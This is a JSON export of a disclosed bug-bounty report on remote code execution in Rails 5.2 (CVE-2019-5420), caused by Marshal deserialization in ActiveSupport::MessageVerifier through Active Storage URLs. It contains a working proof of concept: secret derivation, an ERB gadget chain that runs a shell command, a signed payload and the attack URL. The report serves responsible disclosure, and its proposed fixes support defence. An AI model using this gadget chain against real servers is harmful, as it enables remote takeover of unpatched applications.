{
  "id": 473888,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80NzM4ODg=",
  "url": "https://hackerone.com/reports/473888",
  "title": "RCE which may occur due to `ActiveSupport::MessageVerifier` or `ActiveSupport::MessageEncryptor` (especially Active storage)",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "high",
  "readable_substate": "Resolved",
  "created_at": "2019-01-02T03:20:45.831Z",
  "submitted_at": "2019-01-02T03:20:45.831Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "ooooooo_q",
    "url": "/ooooooo_q",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/9a55e00ecd2cdf18a7f40678e6836e4cdc90bf95eb4b50c43f5fb775da40bb65"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 22,
    "url": "https://hackerone.com/rails",
    "handle": "rails",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Ruby on Rails",
      "twitter_handle": "rails",
      "website": "http://rubyonrails.org/security",
      "about": "Web development that doesn't hurt."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2019-5420"
  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2019-03-13T19:41:52.199Z",
  "bug_reporter_agreed_on_going_public_at": "2019-03-13T19:40:27.183Z",
  "team_member_agreed_on_going_public_at": "2019-03-13T19:41:52.092Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Since `ActiveSupport::MessageVerifier` and `ActiveSupport::MessageEncryptor` use Marshal as the default serializer, I confirmed that RCE is possible by object injection.\n\n\n```ruby\n# https://github.com/rails/rails/blob/v5.2.2/activesupport/lib/active_support/message_verifier.rb#L110\n    def initialize(secret, options = {})\n      raise ArgumentError, \"Secret should not be nil.\" unless secret\n      @secret = secret\n      @digest = options[:digest] || \"SHA1\"\n      @serializer = options[:serializer] || Marshal\n    end\n```\n\n```ruby\n# https://github.com/rails/rails/blob/v5.2.2/activesupport/lib/active_support/message_encryptor.rb#L145\ndef initialize(secret, *signature_key_or_options)\n  options = signature_key_or_options.extract_options!\n  sign_secret = signature_key_or_options.first\n  @secret = secret\n  @sign_secret = sign_secret\n  @cipher = options[:cipher] || self.class.default_cipher\n  @digest = options[:digest] || \"SHA1\" unless aead_mode?\n  @verifier = resolve_verifier\n  @serializer = options[:serializer] || Marshal\nend\n```\n\nEspecially in Rails 5.2 and later, `ActiveSupport::MessageVerifier` is used to validate the URL used in Active Storage, and attacks are possible.\n\n\n```ruby\n# https://github.com/rails/rails/blob/v5.2.2/activestorage/lib/active_storage/engine.rb#L81\ninitializer \"active_storage.verifier\" do\n  config.after_initialize do |app|\n    ActiveStorage.verifier = app.message_verifier(\"ActiveStorage\")\n  end\nend\n```\n\n```ruby\n# https://github.com/rails/rails/blob/v5.2.2/activestorage/app/controllers/active_storage/disk_controller.rb#L38\ndef decode_verified_key\n  ActiveStorage.verifier.verified(params[:encoded_key], purpose: :blob_key)\nend\n```\n\nIt is also used in `ActiveStorage::Blob.find_signed`.\nAlso, these URLs can be accessed without using Active Storage.\n\n### PoC\n\n#### 1. Prepare server\n\n```\n$ ruby -v\nruby 2.6.0p0 (2018-12-25 revision 66547) [x86_64-darwin16]\n\n$ rails -v\nRails 5.2.2\n\n$ rails new verifier_rce\n$ cd verifier_rce/\n$ bundle install\n```\n\n```\n# Active Storage is not installed, but routes is usable\n$ bin/rails routes\nPrefix Verb URI Pattern                                                                              Controller#Action\nrails_service_blob GET  /rails/active_storage/blobs/:signed_id/*filename(.:format)                               active_storage/blobs#show\nrails_blob_representation GET  /rails/active_storage/representations/:signed_blob_id/:variation_key/*filename(.:format) active_storage/representations#show\nrails_disk_service GET  /rails/active_storage/disk/:encoded_key/*filename(.:format)                              active_storage/disk#show\nupdate_rails_disk_service PUT  /rails/active_storage/disk/:encoded_token(.:format)                                      active_storage/disk#update\nrails_direct_uploads POST /rails/active_storage/direct_uploads(.:format)                                           active_storage/direct_uploads#create\n```\n\n#### 2. Prepare payload\n\n```ruby\n$ ls /tmp/rce\nls: /tmp/rce: No such file or directory\n\n$ bundle exec rails console\nRunning via Spring preloader in process 66998\nLoading development environment (Rails 5.2.2)\n\nirb(main):001:0> # emulate verifier\n=> nil\nirb(main):002:0> app_class_name = VerifierRce::Application.name\n=> \"VerifierRce::Application\"\nirb(main):003:0> secret_key_base = Digest::MD5.hexdigest(VerifierRce::Application.name)\n=> \"7e485df67863e85e584b3feecb22276d\"\nirb(main):004:0> key_generator = ActiveSupport::CachingKeyGenerator.new(ActiveSupport::KeyGenerator.new(secret_key_base, iterations: 1000))\n=> #<ActiveSupport::CachingKeyGenerator:0x00007ff55ac60d48 @key_generator=#<ActiveSupport::KeyGenerator:0x00007ff55ac60d98 @secret=\"7e485df67863e85e584b3feecb22276d\", @iterations=1000>, @cache_keys=#<Concurrent::Map:0x00007ff55ac60cf8 entries=0 default_proc=nil>>\nirb(main):005:0> secret = key_generator.generate_key(\"ActiveStorage\")\n=> \"\\xB09\\x11u/6#\\x04\\xE6\\x15\\x9C_\\xBB\\xE8\\x94\\xD0pn<\\xFD\\x15\\x85\\x95\\x8BR\\x82\\x13\\xCA\\xC3\\xDE\\xAEB\\x98\\xDA\\v\\xD6+jI\\xE6\\x80\\x9E\\xC8$e\\xE8(\\xD5\\x98\\x82\\x1FVy1\\x9D>R\\xAE\\x9D\\xAE\\x88\\xF1\\xBA,\"\nirb(main):006:0> verifier = ActiveSupport::MessageVerifier.new(secret)\n=> #<ActiveSupport::MessageVerifier:0x00007ff558aaee20 @secret=\"\\xB09\\x11u/6#\\x04\\xE6\\x15\\x9C_\\xBB\\xE8\\x94\\xD0pn<\\xFD\\x15\\x85\\x95\\x8BR\\x82\\x13\\xCA\\xC3\\xDE\\xAEB\\x98\\xDA\\v\\xD6+jI\\xE6\\x80\\x9E\\xC8$e\\xE8(\\xD5\\x98\\x82\\x1FVy1\\x9D>R\\xAE\\x9D\\xAE\\x88\\xF1\\xBA,\", @digest=\"SHA1\", @serializer=Marshal, @options={}, @rotations=[]>\nirb(main):007:0>\n\n\nirb(main):008:0> # https://medium.com/@u0x/marshall-unserialization-exploit-for-ruby-on-rails-5-1-4-979475cfdba0\n=> nil\nirb(main):009:0> code = '`touch /tmp/rce`'\n=> \"`touch /tmp/rce`\"\nirb(main):010:0> erb = ERB.allocate\n=> #<ERB:0x00007ff55acabdc0>\nirb(main):011:0> erb.instance_variable_set :@src, code\n=> \"`touch /tmp/rce`\"\nirb(main):012:0> erb.instance_variable_set :@filename, \"1\"\n=> \"1\"\nirb(main):013:0> erb.instance_variable_set :@lineno, 1\n=> 1\nirb(main):014:0> dump_target  = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new erb, :result\n=> \"\"\nirb(main):015:0>\n\nirb(main):016:0> verifier.generate(dump_target, purpose: :blob_key)\n=> \"eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHZPa0JCWTNScGRtVlRkWEJ3YjNKME9qcEVaWEJ5WldOaGRHbHZiam82UkdWd2NtVmpZWFJsWkVsdWMzUmhibU5sVm1GeWFXRmliR1ZRY205NGVRazZEa0JwYm5OMFlXNWpaVzg2Q0VWU1FnZzZDVUJ6Y21OSkloVmdkRzkxWTJnZ0wzUnRjQzl5WTJWZ0Jqb0dSVlE2RGtCbWFXeGxibUZ0WlVraUJqRUdPd2xVT2d4QWJHbHVaVzV2YVFZNkRFQnRaWFJvYjJRNkMzSmxjM1ZzZERvSlFIWmhja2tpREVCeVpYTjFiSFFHT3dsVU9oQkFaR1Z3Y21WallYUnZja2wxT2g5QlkzUnBkbVZUZFhCd2IzSjBPanBFWlhCeVpXTmhkR2x2YmdBR093bFUiLCJleHAiOm51bGwsInB1ciI6ImJsb2Jfa2V5In19--78c21ddf5ca4239d862118730069e04fbf38fd3d\"\n```\n\n```\n# Confirm that the file was generated due to the side effect of creating payload\n$ ls /tmp/rce\n/tmp/rce\n\n# Erase the file as it disturbs the operation check\n$ rm /tmp/rce\n$ ls /tmp/rce\nls: /tmp/rce: No such file or directory\n```\n\n#### 3. Attack\n\nStart server.\n\n```\n$ bin/rails s\n```\n\nOpen URL in browser.\n(`GET  /rails/active_storage/disk/:encoded_key/*filename`, use payload for `:encoded_key`)\n\n```\nhttp://0.0.0.0:3000/rails/active_storage/disk/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHZPa0JCWTNScGRtVlRkWEJ3YjNKME9qcEVaWEJ5WldOaGRHbHZiam82UkdWd2NtVmpZWFJsWkVsdWMzUmhibU5sVm1GeWFXRmliR1ZRY205NGVRazZEa0JwYm5OMFlXNWpaVzg2Q0VWU1FnZzZDVUJ6Y21OSkloVmdkRzkxWTJnZ0wzUnRjQzl5WTJWZ0Jqb0dSVlE2RGtCbWFXeGxibUZ0WlVraUJqRUdPd2xVT2d4QWJHbHVaVzV2YVFZNkRFQnRaWFJvYjJRNkMzSmxjM1ZzZERvSlFIWmhja2tpREVCeVpYTjFiSFFHT3dsVU9oQkFaR1Z3Y21WallYUnZja2wxT2g5QlkzUnBkbVZUZFhCd2IzSjBPanBFWlhCeVpXTmhkR2x2YmdBR093bFUiLCJleHAiOm51bGwsInB1ciI6ImJsb2Jfa2V5In19--78c21ddf5ca4239d862118730069e04fbf38fd3d/test\n```\n\nConfirm that the file was created.\n\n```\n$ ls /tmp/rce\n/tmp/rce\n```\n\n## Impact\n\nIf the server is running in development mode with version 5.2 or later, if the attacker can know application name, `secret_key_base` can be obtained, so RCE can be easily done by accessing the URL.\nIn production mode, an attacker needs to know `secret_key_base`.\n\nFor versions less than 5.2, attacks are possible only if the user is able to input places using `ActiveSupport::MessageVerifier` or `ActiveSupport::MessageEncryptor` and the attacker knows `secret_key_base`.\n\n### proposed measures\n\n- Use `JSON.load` or `Yaml.safe_load` without using Marshal\n- Disable access to URL if Active Storage is not used",
  "bounty_amount": "1500.0",
  "formatted_bounty": "$1,500",
  "weakness": {
    "id": 58,
    "name": "Command Injection - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2019-04-12T19:40:27.278Z",
  "allow_singular_disclosure_after": -152732130.82548535,
  "singular_disclosure_allowed": true,
  "vote_count": 41,
  "voters": [
    "kapytein",
    "nikitastupin",
    "bl4de",
    "ali",
    "leetboi",
    "romesful",
    "apapedulimu",
    "mysterican",
    "khizer47",
    "sa1tama0",
    "and 31 more..."
  ],
  "severity": {
    "rating": "high",
    "author_type": "User"
  },
  "structured_scope": {
    "databaseId": 160,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "https://github.com/rails/rails",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
